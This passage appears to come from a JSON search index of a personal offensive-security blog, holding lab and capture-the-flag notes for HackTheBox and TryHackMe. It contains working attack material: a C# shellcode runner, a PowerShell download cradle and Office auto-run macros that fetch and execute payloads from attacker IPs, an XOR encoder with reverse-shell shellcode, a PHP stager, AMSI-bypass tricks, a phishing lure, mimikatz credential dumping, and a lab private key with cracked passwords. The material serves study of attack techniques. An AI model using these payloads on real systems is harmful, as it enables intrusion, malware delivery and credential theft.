35,0x69,0x44,0x6e,0x51,0x36,0x56,\t\t\t\t0x4d,0x76,0x51,0x64,0x2d,0x73,0x43,0x79,0x62,0x64,0x68,0x55,0x30,0x34,0x71,\t\t\t\t0x64,0x46,0x54,0x4c,0x69,0x30,0x6b,0x58,0x6c,0x34,0x32,0x76,0x6d,0x64,0x6d,\t\t\t\t0x76,0x34,0x74,0x4d,0x68,0x66,0x6c,0x7a,0x71,0x77,0x78,0x6f,0x36,0x78,0x71,\t\t\t\t0x63,0x4c,0x65,0x59,0x4a,0x45,0x33,0x30,0x58,0x79,0x79,0x45,0x43,0x32,0x4c,\t\t\t\t0x52,0x4c,0x66,0x4b,0x31,0x79,0x5a,0x6f,0x75,0x6b,0x58,0x30,0x47,0x39,0x6d,\t\t\t\t0x41,0x67,0x75,0x4c,0x42,0x53,0x55,0x45,0x5f,0x74,0x47,0x61,0x41,0x5f,0x58,\t\t\t\t0x52,0x50,0x57,0x63,0x6b,0x41,0x7a,0x6a,0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,\t\t\t\t0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,0x32,0xe8,0x84,0x53,0x53,0x53,0x57,0x53,\t\t\t\t0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0x0a,0x5f,0x68,0x80,0x33,\t\t\t\t0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,\t\t\t\t0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,\t\t\t\t0xc0,0x75,0x14,0x68,0x88,0x13,0x00,0x00,0x68,0x44,0xf0,0x35,0xe0,0xff,0xd5,\t\t\t\t0x4f,0x75,0xcd,0xe8,0x4a,0x00,0x00,0x00,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,\t\t\t\t0x68,0x00,0x00,0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,\t\t\t\t0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,\t\t\t\t0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,\t\t\t\t0x58,0xc3,0x5f,0xe8,0x6b,0xff,0xff,0xff,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,\t\t\t\t0x2e,0x34,0x39,0x2e,0x36,0x36,0x00,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,\t\t\t\t0xff,0xd5 };            int size = buf.Length;            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);            Marshal.Copy(buf, 0, addr, size);            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);            WaitForSingleObject(hThread, 0xFFFFFFFF);        }    }}This run.ps1 is a lightly modified download cradle to be downloaded and run by the Victim PC$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/ClassLibrary1.dll')$assem = [System.Reflection.Assembly]::Load($data)$class = $assem.GetType(\"ClassLibrary1.Class1\")$method = $class.GetMethod(\"runner\")$method.Invoke(0, $null)This VB macro would be embeded in the Word/Execel DocumentvbapplicationSub MyMacro()Dim str As Stringstr = \"powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.ps1') | IEX\"Shell str, vbHideEnd SubSub Document_Open()MyMacroEnd SubSub AutoOpen()MyMacroEnd Sub",
        "url": "/xdev/dllrefload/"
      }
      ,
    
      "htb-shibboleth": {
        "title": "HackTheBox - Shibboleth",
        "author": "",
        "category": "",
        "content": "WriteUp - HackTheBoxShibboleth is a medium machine on HackTheBox that requires regular web application enumeration for user access and critical service version assessment for privilege escalationbiggest take away from this machine is the reminder to always look into services running on UDPGetting Into ItAs with other HTB machines we start off by adding the machines name to our /etc/hosts file and proceeding with a regular port scan to probe for open ports on the targetfuther UDP scan shows IPMI running on its regular port 623, Intelligent Platform Management Interface (IPMI) is a collection of specifications that define communication protocols for talking both across a local bus as well as the network.IPMI has a vulnerability which Basically,** allows you to request the server for the hashes MD5 and SHA1 of any username and if the username exists those hashes will be sent back.** And there is a **metasploit module **for testing this  msf &gt; use auxiliary/scanner/ipmi/ipmi_dumphashesrunning the module againts the web server we are able to secure the hash of the the Administrator userproceeding to crack the hash we recover a password for the Administrator account  for those interested the hash format is “IPMI2 RAKP HMAC-SHA1” which is module 7300 on hashcatwithout any further use of the IPMI protocol we proceed to enumerating TCP port 80PORT 80Enumerating port 80 shows a bootstrap HTML template running with no angle of exploitationfurther check by way of subdomain enumeration reveals one web applications running on two different subdomains“monitor” and “zabbix”Looking at the subdomain we find Zabbix to be running, Zabbix is an open-source software tool to monitor IT infrastructure such as networks, servers, virtual machines, and cloud services.Though there is no way to figure the version of zabbix running, by reading the advisory on the zabbix official website we figure recent version of the zabbix web application to be vulnerable to an Authenticated Remote Code Execution VulnerabilityZabbix 5.0.17 — Remote Code Execution (RCE) (Authenticated)running the exploit against the target we secure a shell as the user Zabbixreading the user.txt **file requires us to be privilege as the **ipmi-svc user, we can do lateral privileged escalation to the ipmi-svc user by “su ipmi-svc” using the password earlier gathered from the IPMI vulnerabilityuser.txtHorizontal Privileged EscalationBy looking for credentials in configuration filesusing find to enumerate conf fileswe are able to read clear text database credentials in the **zabbix_server.conf **fileauthenticating to the MySql database with the credentials from the configuration file, we immediately notice the version of MySql to be a 10.3.25-MariaDB which is vulnerable to a code execution as CVE:2021–27928service version enumerationexploiting the vulnerability require the attacker to create a reverse_shell binary preferable with msfvenom which is to be supplied to MySql as an executable using the -e parametercreating a elf binary with msfvenomwe proceed the exploitation process by transferring the reverse shell payload to the target machine then connecting the MySql once again with the SET GLOBAL wsrep_provider variable set to our binary as illustrated in the PoC  *PoC available at https://packetstormsecurity.com/files/162177/MariaDB-10.2-Command-Execution.htmlmysql -u &lt;user&gt; -p -h &lt;ip&gt; -e 'SET GLOBAL wsrep_provider=\"/tmp/CVE-2021-27928.so\";'Setting up a listener and running the exploit give us a a shell with root privileges as the MySql Service is running with root privilegesAnd as always, RememberThe difference between a noob and a hacker is that, a hacker has failed more than a noob has ever tried",
        "url": "/htb/shibboleth/"
      }
      ,
    
      "xdev-helpers": {
        "title": "Custom Encryptor &amp; Helpers | Variations",
        "author": "",
        "category": "",
        "content": "All exploits are written my myself and are for educational purposes only, i would not be liable for any misuse!###Helpers and encryptorsC Shellcode XOR Helper```csharp#include #include #include // To compile:// gcc simpleXORencoder.c -o simpleXORencoder// msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.67 LPORT=80 -f cunsigned char buf[] = “\\x48\\x31\\xff\\x6a\\x09\\x58\\x99\\xb6\\x10\\x48\\x89\\xd6\\x4d\\x31\\xc9”“\\x6a\\x22\\x41\\x5a\\xb2\\x07\\x0f\\x05\\x48\\x85\\xc0\\x78\\x51\\x6a\\x0a”“\\x41\\x59\\x50\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05”“\\x48\\x85\\xc0\\x78\\x3b\\x48\\x97\\x48\\xb9\\x02\\x00\\x01\\xbb\\xc0\\xa8”“\\x31\\xa4\\x51\\x48\\x89\\xe6\\x6a\\x10\\x5a\\x6a\\x2a\\x58\\x0f\\x05\\x59”“\\x48\\x85\\xc0\\x79\\x25\\x49\\xff\\xc9\\x74\\x18\\x57\\x6a\\x23\\x58\\x6a”“\\x00\\x6a\\x05\\x48\\x89\\xe7\\x48\\x31\\xf6\\x0f\\x05\\x59\\x59\\x5f\\x48”“\\x85\\xc0\\x79\\xc7\\x6a\\x3c\\x58\\x6a\\x01\\x5f\\x0f\\x05\\x5e\\x6a\\x7e”“\\x5a\\x0f\\x05\\x48\\x85\\xc0\\x78\\xed\\xff\\xe6”;int main (int argc, char **argv){        int key = 112;        int buf_len = (int) sizeof(buf);    printf(\"XOR payload (key 0xfa):\\n\");    for(int i=0; i&lt;buf_len; i++)    {            printf(\"\\\\x%02X\",buf[i]^key);    }    return 0; }```",
        "url": "/xdev/helpers/"
      }
      ,
    
      "lab-holo": {
        "title": "TryHackMe - HoloLive",
        "author": "",
        "category": "",
        "content": "###HoloLive lab from THMManaged Code: code that you develop with a language compiler that targer the runtime.NET Language → CIL/MSIL → CLR → machine code.NET uses a run time environment called Common Language Runtime, Which can be used to run managed code written in C#, Powershell or VBUnmanaged code automatically skips the CLR and runs on the Operating system directlyhttps://docs.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/dynamic-language-runtime-overview================================================================================================================Enumerate Containers with DeepCE . Deep Container EnumerationLess Processes running is usually a pointer of being in a containerThe presece of .dockerenv  in the root directory is also another very good pointerreatinh the /proc/1/cgroups would usually show path used by docker which in additional pointerSecuring COntainershttps://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.htmlDocker SUIDlist available docker images: docker imagesthendocker run -v /:/mnt –rm -it {image_name:Image_tag} chroot /mnt /bin/bashdocker run -v /:/mnt –rm -it ubuntu:18.04 chroot /mnt /bin/bash================================================================================================================C2 CONVENANTFurther study : https://www.youtube.com/watch?v=oN_0pPI6TYU.Run Convenentsudo dotnet run –project /opt/Covenant/Covenantnavigate : https://127.0.0.1:7443LISTENERTo create a basic listener for this network we only suggest editing the Name, ConnectPort, and ConnectAddressesLAUNCHERThere are several options for each launcher, with some launchers having specific options. For this task, we will be focusing on the binary launcher and its optionsTo create a basic launcher for this network, we only suggest editing the Listener and ImplantTemplateCustom C2 Grunt Convenant isnt resource full but enables you to create your own task with c# code in a YAML formatthe template follows the follwoing structure• Name Name of the task in Covenant UI.• Aliases Aliases or shortcuts for the task.• Description Description of the task in Covenant UI.• Language Language the task source code is written in.• CompatibleDotNetVersions Versions of .NET the source code will run on.• Code Source code of task.================================================================================================================AMSI Bypassesusually EDR looks for signature sin bypasses like AmsiScanBuffer, amsiInitFailed, AmsiUtilsUse AMSI trigger to find what part of the AMSi bypass payload is triggering the error :  https://github.com/RythmStick/AMSITriggerTo use AMSITrigger, we only need to specify two parameters, -u, —url or -i, —inputfile and -f, —format. Find example syntax below.Syntax: .\\AMSITrigger.exe -u  -f 1 or .\\\\AMSITrigger.exe -i  -f 1The area in red is what triggers the AMSI, so we can edit and obfucate that section using method like  “String Concatenation” : $OBF = ‘Ob’ + ‘fu’ + ‘s’ +’cation’Additional methods• Concatenate - (‘co’+’ffe’+’e’)• Reorder - (‘{1}{0}’-f’ffee’,’co’)• Whitespace - ( ‘co’ +’fee’ + ‘e’)Another payload ObfuscationInvoke-Obfuscation -ScriptBlock {‘Payload Here’} -Command ‘Token\\String\\1,2,\\Whitespace\\1’ -Quiet -NoExitRun Powershell command with a php file : PHP-Wrapper.php#Single Command&lt;?php  function compile_stager() {    $init = “powershell.exe”;    $payload = “”; // Insert PowerShell payload here    $execution_command = “shell_exec”;    $query = $execution_command(“$init $payload”);    echo $query; // Execute query  }   compile_stager();?&gt;##Double Command &lt;?php  function get_stager() {    $init = “powershell.exe”;    $payload = “Invoke-WebRequest 127.0.0.1:8000/shell.exe -outfile notashell.exe”; // Insert PowerShell payload here    $execution_command = “shell_exec”;    $query = $execution_command(“$init $payload”);    echo $query; // Execute query  } function execute_stager() {  $init = “powershell.exe”;    $payload = “.\\notashell.exe”; // Insert PowerShell payload here    $execution_command = “shell_exec”;    $query = $execution_command(“$init $payload”);    echo $query; // Execute query }  get_stager();  execute_stager();  die();?&gt;================================================================================================================Enumerate for Applocker policy            Get-AppLockerPolicy -Effective      select -ExpandProperty RuleCollections      we can use applocker checker to determin location and directories from which we can run certai programshttps://github.com/HackLikeAPornstar/GibsonBird/blob/master/chapter4/applocker-bypas-checker.ps1.================================================================================================================Enumerating for EDR and AntiVirusesWe can use Seatbelt and SharpEDRChecker./Seatbelt.exe Examples./Seatbelt.exe CredEnum./Seatbelt.exe ScheduledTasks./Seatbelt -group=fullFor more infohttps://github.com/GhostPack/Seatbelt#command-groups================================================================================================================POWERVIEWits great to use poweview to find all the groups available on the AD, then find the group members of those particular groups, then maybe find a PC where one of those member are currently signed in too, if you can local admin on that PC ; go ahead to authenticate to it so as to dump the hashes of the juicy user then PTHGet-NetLocalGroupcommand will list all groups preset on a local machine/computerGet-NetLocalGroupMember -GroupName “Administrators”command will list all members of the specified groupGet-LoggedOncommand enumerate logged on users on current local machine/computerGet-DomainGPOenumerate domain policies such as ApplockerFind-LocalAdminAccessThis command usually check for all the host connected to the domain and checks to see which of those host is our current user/or supplied user a Local admin onYou can use Ps-Remoting to authnticate on the machineThen  dump hashes with Invoke-MimikatzEx.ps1================================================================================================================Enumerating and Exploiting Schedules tasksGet-SheduledTaskthen filter down to get task that are in the users subdirtectoryGet-SheduledTask -TaskPath “\\Users*”Read task infomation withGet-ScheduledTaskInfo -TaskName “proxy”================================================================================================================Switch user using runasrunas /user:ratty  powershell.exe     ! then enmter password when prompted",
        "url": "/lab/holo/"
      }
      ,
    
      "lab-throwback": {
        "title": "TryHackMe - ThrowBack",
        "author": "",
        "category": "",
        "content": "###Throwback lab from THM=========================================================================================ACTIVE DIRECTORY =========================================================================================An Active Directory collections of servers and computers inside a domainAn Active Directory collections of servers and computers inside a domainDomain controller is a windows server running the Active Directory Domain ServicesTypes of Active Directory Users :Domain Administrators   : Controls the domain and usually have access to the domain controllersService Accounts   : used mostly for service maintenanceLocal Administrators   : have access and make changes to the local computersDomain Users    : eveeryday users on the domainDomain Policies :They dictate how a server operate and dictate what rules it will and will not followSample Policies =Disable Windows Defender -  Disable windows defeender across all machine on the domainDigitallly Sign Communication - Can disable  or enable SMB signing on the domain controllerDomain Services :The service the domain controller provides to the PC in the domain, ExampleLDAPDNS, LLMNR,NBT-NSDomain Authentication :the authentication proceddure set in place implemented across the domainKerberos = uses ticket granting ticker and service tickets fot auth purposesNTLM + default windows auth protocoal uses encrypted challenge / response=========================================================================================POWERSHELL=========================================================================================Powershell has a VERB-NOUN flavorExample of Verbs:GetStartStopNewOotReadWriteExample of statements : get-helpGet-Command gets all the cmdlets installed on the current device. The  great thing about this cmdlet is that it allows for pattern matching  like the following.Seaching for commands using Get-Command +  wildcards :  Get-Command -Help  Get-Command Get-FIltering Objects :Verb-Noun | Where-Object -Property PropertyName -operator ValueHere’s an example of checking the stopped processes:=========================================================================================POWERSHELL DOMAIN ENUMERATION=========================================================================================USING POWERVIEWGet-NetDomain     :   List domian information inluding FQDNGet-NetDOmainController   ;  List all the domain controllers within the networkGet-NetForest  : Provides all the assosiated domains in a forest, the root domain , as well as the domain controller for the root domainGet-NetDomainTrust   : Provide trust information across domains=========================================================================================ENTERING THE BREACH =========================================================================================Publicly facing machines in the NetworkThrowback-PRODThrowback-FW01Throwback-MAILATTACKING - PROD  10.200.154.219Domain Name : THROWBACK.LOCAL\tNetBIOS COmputer Name : THROWBACK-PRODDNS Computer Name : THROWBACK-PROD.THROWBACK.localATTACKING  - MAIL 10.200.154.232credentials : tbhguest:WelcomeTBH1!Extracted  contacts from the mailserver using guest account                   W Humphrey      HumphreyW      HumphreyW@throwback.local                            SummersW      Summers Winters      SummersW@throwback.local                            FoxxR      Rikka Foxx      FoxxR@throwback.local                            noreply      noreply noreply      noreply@throwback.local      TBH{4060a70860f0a1648e5a991de1739888}                     DaibaN      Nana Daiba      DaibaN@throwback.local                            PeanutbutterM      Mr Peanutbutter      PeanutbutterM@throwback.local                            PetersJ      Jon Peters      PetersJ@throwback.local                            DaviesJ      J Davies      DaviesJ@throwback.local                            BlaireJ      J Blaire      BlaireJ@throwback.local                            GongoH      Hugh  Gongo      GongoH@throwback.local                            MurphyF      Frank Murphy      MurphyF@throwback.local                            JeffersD      D Jeffers      JeffersD@throwback.local                            HorsemanB      BoJack Horseman      HorsemanB@throwback.local             SummersW@throwback.local,FoxxR@throwback.local,DaibaN@throwback.local,PeanutbutterM@throwback.local,PetersJ@throwback.local,DaviesJ@throwback.local,BlaireJ@throwback.local,GongoH@throwback.local,MurphyF@throwback.local,JeffersD@throwback.local,HorsemanB@throwback.localSummersW@throwback.local   FoxxR@throwback.local   DaibaN@throwback.local   PeanutbutterM@throwback.local   PetersJ@throwback.local   DaviesJ@throwback.local    BlaireJ@throwback.local     GongoH@throwback.local    MurphyF@throwback.local   JeffersD@throwback.local   HorsemanB@throwback.local“SummersW@throwback.local”,”FoxxR@throwback.local”, “DaibaN@throwback.local”, “PeanutbutterM@throwback.local”, “PetersJ@throwback.local”, “DaviesJ@throwback.local”, “BlaireJ@throwback.local”, “GongoH@throwback.local”, “JeffersD@throwback.local”, “HorsemanB@throwback.local”EmailHey Team,There has been an update the the official Microsoft outlook used in our environment, kindly download and install the binary attached to this email with urgency to update outlook in order to avoid downtimesThank you for your complianceIT SupportATTACKING - FW01  10.200.154.138pfsense using default credentialsID_RSA—–BEGIN RSA PRIVATE KEY—–MIIEowIBAAKCAQEAqgsr8IE43iaA7wzgTmbpjB7WsRC2lIRFJkgTo4rFkfAck/lmc4Q+SuwtpjYv9XK57Qwi/Qx2E08V27SpBPp/wFSQAao9XyRqwITdHWYTTmdcdAAKdReGxZYCDbweQkkgx2estvSTQ48OltKDgSBJyc7g+1t8eDWS91ubFkSbCtbdeUpZO+i25eXNX8PeJSWWG9qGxisa2+DJJO4GED+QY4VbSNugINhuWGM33FPsNbKag7dHM2J7JNkGZKd6HyR7t87rwlqWxiQytSAb9WCwuPnVL7PBl1aawSdqcaN2QFx7EFxnJP7Fhg1ZJLTfuewcYbdqrN5ltOLnI3a9EE7I1wIDAQABAoIBAEq0TcGDg/BVCh/7kC/hlokwozF3Hj9xPM/sqnQW62WKD4QS9aeaWaOgzw1OkRNMK9Kwmk6Bwv4IqJm1bOv7AVUF0Z5ppDzASwX5WQspZSH01vE/c1it1U/I724JT2Hfrr7sFTzrhicQGmC4a323KbO3Z7AGKVDGeKKjZCcMTPEdbPkGriD6o72cQjxNutUttHMl19MQ9itksh538fuG8WjmZoN2ml9oz29IuLR/riIQq2HJ4CTRX10iEJU0yeJNhYpyAuuzl7OE35+J30/yGwKGX6Nm4z5JXuua6L7faL2qDjuD5cSVM02iPfs8Xyo/R8yWhxvQ50JupzN/LgG/RYECgYEA2p24GsmejWqBavcZLwRfqIgSTxsL/7015JVOF/i8xqNEFRjreHEndVvEfZI2LvBSl9ZPnxu/hVJ3cE6OK6GrGuDt1Aj3HxZRXU5W33mw3jM4QmPfDc5DNzzvWB9ZIrbzFrrza4cuwtYJqWsny2yIMOnCFAyR+4E9EQYJmkKtwW8CgYEAxx8c9OZwh97VRT19mETnIbVoF91nb18D+IVK2n/+cNa76LRoz+2wafEYbsXzm0FClcEPuL+iWqCl5GhrrypBnPH77rO2F2It2mmeNlmICK7bhFdCrsKiB+1DV7q1hiMHjWXSh5kFN6ekjWQaHEf/iTPUcWvyMY1Kj5rqYlCa6xkCgYBpq57X4+jttjOEPpg/r7+FOPCQqCQuo4ivSrQKxkKJSVWZVQhMmXVXNtpNUCU8nxFtLzwhTkpO6UOuV2pFEMoiHeMXgJXiwujlTv6S2sFxRhTFkny4saCvzJZsZAqzyvbJX+hVa2xg5RCagZ8kpvtVmUgkZMcTaK7Z0a9Gj0BppQKBgQCDdVwFpvlWClxc2QrI83xwebZeQxKdqWoSsdVIScYusuXd7PVhiPe2CbDquQ9qSXxvJ8V8YDAMixDaqcGmJEyrE+sSnVyzNWM2VhJYqWUw7lgImB9zBxY4C4ExMxfSld/PjxCd6v1R0ADIQ/UlBLeE2k4AD5cW9cPq6QiinbqZSQKBgBzPXrMIM+4RAMz2MLcjBhZBVJ3pYt1PM4UorfWJhi+vgDdYxwIZ4fYexklP11hdkJ2lG20fA0tqaCuOtcos7cQFrLwjAQJA6TrO+qfhHEbgaZVI7UYa1PPvzMHfl5yy1ghQeCUMoDbw1Wa0ohy9/6fABe45ACh1DOE72LOGf3Cr—–END RSA PRIVATE KEY—–ssh -i id_rsa root@10.200.154.138POST EXPLOITATION ON FW01credentials found in log filesHumphreyW:1c13639dba96c7b53d26f7d00956a364=========================================================================================FIRST CONTACT=========================================================================================PASSWORD SPRAYINGSome examples of weak passwords:    Summer2020    Management2020    Management2018    Password2020    2020    Password123[80][http-post-form] host: 10.200.154.232   login: MurphyF   password: Summer2020=========================================================================================PHISHING=========================================================================================Target IdentificationPayloadsStaged &amp; Stageless payloads:staged payloads requires an handler to catch the payload and send the second stage to trigger the reverse shell    Example : windows/x64/shell/reverse_tcpstageless payalods do not requre an handler and can be caught with utilities like netcat    Example : Windows/x64/shell_reverse_tcp=========================================================================================HASH CRACKING USING RULES=========================================================================================Asides from running hashcat agains a wordlists, it is advidable to use rules while bruteforcing we can also use mentallist tools to generate a custom password listSometimes your standard wordlist like rockyou is not enough to crack a hash. You can use a rule list to change the wordlist and add rules to it in order to crack a hash. A rule list works by having a set of rules that can append characters to a password, attach characters, and substitute words and characters.https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rulePETERSJ::THROWBACK:81847d458ac9f3d1:d008a6c248e65c98d2e39598caa8d1ac:0101000000000000005c38476a0dd801e5e171523de4361d0000000002000800340031004d004b0001001e00570049004e002d00550052004400530059004c00510053005a003600360004003400570049004e002d00550052004400530059004c00510053005a00360036002e00340031004d004b002e004c004f00430041004c0003001400340031004d004b002e004c004f00430041004c0005001400340031004d004b002e004c004f00430041004c0007000800005c38476a0dd801060004000200000008003000300000000000000000000000002000007d5c6421d062fd571e0c26dd53578f8116274945c049da7ed89a81eb6a255bbc0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00350030002e003100350031002e00320035000000000000000000:Throwback317Password: Throwback317Local Priviledge Escalation on PRODDefaultDomainName    :DefaultUserName      : BlaireJDefaultPassword      : 7eQgx6YzxgG3vC45t5k9AltDefaultDomainName :AltDefaultUserName   :AltDefaultPassword   :Domain Enumeration on PROD from Blairejxfreerdp /v:10.200.154.219 /u:blairej /p:7eQgx6YzxgG3vC45t5k9 /size:96%impacket-psexec throwback.local/BlaireJ:7eQgx6YzxgG3vC45t5k9@10.200.154.219Get-NetDomainForest                  : THROWBACK.localDomainControllers       : {THROWBACK-DC01.THROWBACK.local}Get-NetDomainControllerForest                     : THROWBACK.localCurrentTime                : 1/19/2022 8:23:20 PMHighestCommittedUsn        : 2261635OSVersion                  : Windows Server 2019 DatacenterRoles                      : {SchemaRole, NamingRole, PdcRole, RidRole…}Domain                     : THROWBACK.localIPAddress                  : 10.200.154.117SiteName                   : THROWBACK            Get-NetUSer      select cn      AdministratorGuestkrbtgtWEBServiceRikka FoxxSummers WintersJohn BlairesshdSQLServiceNana DaibaLeeroy StuartTBServiceLoginServiceSTAGEServiceRue WhiteAlisha GuthrieHallie CochranVicky BurtonWilliam PowellDerick NievesJoy CastroWalter PooleBryan AtkinsFaussie HamptonCourtney HaydenClara QuinnTony RosalesAva PetersenRene EatonMarvin LivingstonHugh GongoStacey FoleyViolet BoyerDeno JacobsonJayne NixonHans WebbNorman LindseyLacey ParkerLanny SextonDiann AndersonJerrod SpenceLLoyd SosaRobert NealBette BaldwinAdrienne BlackwellCheryl TrevinoPedro KramerStephen ClayIvan MontoyaJosef BrenardDaniel ThortonVerna BlackenshipDominic CortezMerle WilliamsonWeston HansonJeff LambLewis StanleyShanna CunninghamDominique PateEzra HardingErik WilkinsonKent BrooksJody DotsonAngelica BentonRenee BurchSpooksDominic JeffersJon PetersWittingston HumphreyBojack HorsemanTaskMgrHans MercerBackup User=========================================================================================C2 - Empire and StarKiller=========================================================================================1.) Go to the listeners tab and select CREATE LISTENER.2.) Go to the stagers tab and select GENERATE STAGER.Launch agent on the targetshell on c2Invoke-Mimikatz module on Empiremimikatz(powershell) # lsadump::lsa /patch Domain : THROWBACK-PROD / S-1-5-21-1142397155-17714838-1651365392  RID  : 000003f2 (1010) User : admin-petersj LM   :  NTLM : 74fb0a2ee8a066b1e372475dcbc121c5  RID  : 000001f4 (500)  User : Administrator LM   :  NTLM : a06e58d15a2585235d18598788b8147a  RID  : 000001f7 (503) U ser : DefaultAccount LM   :  NTLM :   RID  : 000001f5 (501) User : Guest LM   :  NTLM :   RID  : 000003f1 (1009)  User : sshd LM   :  NTLM : fe2acb5ea93988befc849a6981e0526a  RID  : 000001f8 (504)  User : WDAGUtilityAccount LM   :  NTLM : 58f8e0214224aebc2c5f82fb7cb47ca1=========================================================================================Mimikatz - hashdump=========================================================================================put Mimikatz in privilege mode after deactivating AMSI and EDRprivilege::debugtoken::elevateDumping Password Hasheslsadump::lsa /patchsekurlsa::tickets /exportDumping SAM Hasheslsadump::samDumping Creds from Logged In Userssekurlsa::logonPasswords=========================================================================================BLOODHOUND - Sharphound injestor =========================================================================================. ./SharpHound.ps1Invoke-Bloodhound -CollectionMethod All -Domain throwback.local -ZipFileName loot.zip=========================================================================================LATERAL MOVEMENT // ROUTING &amp; PROXYCHAINS=========================================================================================To get access to internal networks, we first get access to a meterpreteruse post/multi/manage/autorouteto set up the routing tables so data from the attacker PC, can be routed to the internal network through the victimuse auxiliary/server/socks_proxyto setup the socks proxy server on the attacking machineset verson to 4asrvhost 127.0.0.1proxychains crackmapexec smb 10.200.154.0/24 -u users -d throwback.local -H hash=========================================================================================KERBEROASTING=========================================================================================Its noteworthy that kerberoasting targets service accounts, and not user account !we can find kerberoastable accounts using Bloodhoud graphproxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 10.200.154.117  THROWBACK.local/blairej:7eQgx6YzxgG3vC45t5k9 -requestCracked Creds from kerberoasting : mysql337570http://timekeep.throwback.local/dev/passwordreset.php?user=murphyf&amp;password=hacker1Password reset to hacker1Password successfully updated TBH{326e71e82d2cfc439ee513340b8d9222}=========================================================================================MALICIOUS MACRO &amp; MSFCONSOLE HTA SERVER=========================================================================================After adding macro to xlsmwe use the  “windows/misc/hta_server ” module in msf to host a malicious HTA as a second stage payload to be sentMACRO USED BELOWSub HelloWorld()    PID = Shell(\"mshta.exe https://192.168.100.128:8080/c9496fz.hta\")End SubSub Auto_Open()    HelloWorldEnd Sub=========================================================================================Got access tp TImeKeep machine using HTA server method, mograted process to an NT/AUTORITY service then hashdump to gather credentialsmeterpreter &gt; hashdump Administrator:500:aad3b435b51404eeaad3b435b51404ee:43d73c6a52e8626eabc5eb77148dca0b:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::sshd:1008:aad3b435b51404eeaad3b435b51404ee:6eea75cd2cc4ddf2967d5ee05792f9fb:::Timekeeper:1009:aad3b435b51404eeaad3b435b51404ee:901682b1433fdf0b04ef42b13e343486:::WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::CRACKEDuser:pass      Timekeeper:keeperoftime    meterpreter &gt; creds_all[+] Running as SYSTEM[*] Retrieving all credentialsmsv credentials===============  Username         Domain          NTLM                              SHA1——–         ——          —-                              —-Administrator    THROWBACK-TIME  43d73c6a52e8626eabc5eb77148dca0b  f994d4fe03f5ac239de4971c50f3af42e7c9436eTHROWBACK-TIME$  THROWBACK       9dcc499124209f0aa44a20c478aa53fd  13c7c5ddf0ec9ccf5fe0b2f6b281adb51cb82b1cwdigest credentialsUsername         Domain          Password——–         ——          ——–(null)           (null)          (null)Administrator    THROWBACK-TIME  (null)THROWBACK-TIME$  THROWBACK       (null)kerberos credentialsUsername         Domain           Password——–         ——           ——–(null)           (null)           (null)Administrator    THROWBACK-TIME   (null)THROWBACK-TIME$  THROWBACK.local  d1 f7 12 36 94 54 fc ce 9b 8a 4b f0 0f b9 c1 82 14 bd 6c 24 c3 93 5d 4d 69 8d e7 f                                  5 44 81 f1 1c cc 10 86 58 21 fd a7 9e ff 8d 38 72 de 1a d8 b8 7a 8d bb 95 9f 9f 28                                   42 a1 76 73 a9 56 7b 9e 39 30 f4 f6 84 0f c6 e3 dd 27 07 d8 a9 78 a1 5c 09 fe fb                                  33 10 d9 d2 2d 76 7b 7e ac 1c d5 04 df 1e e1 cc 2a af ca 0b ad 51 a0 1b eb 35 32 2                                  5 98 89 73 40 45 18 5c b4 51 7b f5 7f 1f fa 40 80 97 a2 f9 15 05 ec 81 b9 93 15 66                                   ea 96 d8 2e 1b e2 2f 42 59 b9 ab d3 ce 7f 05 1b 10 78 d0 9c f3 62 d1 05 c3 60 6a                                  b9 4f 66 ab 53 b5 09 48 27 94 84 1c dd 79 0f 04 98 cc e2 39 4b 41 e0 23 d1 8e 15 8                                  6 db ab 02 24 73 57 79 fd d4 f8 0f 06 f5 4c d0 18 25 7a 72 5e 35 1f b9 9f 38 e2 00                                   94 c0 df e8 a8 7e 19 c4 75 09 15 63 0d 4c d9 65 5b 6e 6f 91 7athrowback-time$  THROWBACK.LOCAL  (null)ACCESS TO TIMEKEEPERproxychains ssh Timekeeper@10.200.154.176     pw: keeperoftimegot access to timekeeper user;  created and sent in mrat.exe to get meterpreter shell; migrated to NT/AUTHORITY process; entered system shell ; change admin password to random using net user administrator /randomthen ssh’sd into admin account using proxychainsACCESS TO MYSQLDB FROM TIMEKEEPERusers in database from timekeep machine+————————-+| users                   |+————————-++—————+————————————————-+| USERNAME      | PASSWORD                                        |+—————+————————————————-+| spopy         | ilylily                                         || foxxr         | Fnfdsfdf49sA(2o1id                              || winterss      | rei0g0erggdfs(2o1id                             || daiban        | Bananas!                                        || blairej       | BlaireJ2020                                     || FLAG          | TBH{ac3f61048236fd398da9e2289622157e}           || daviesj       | 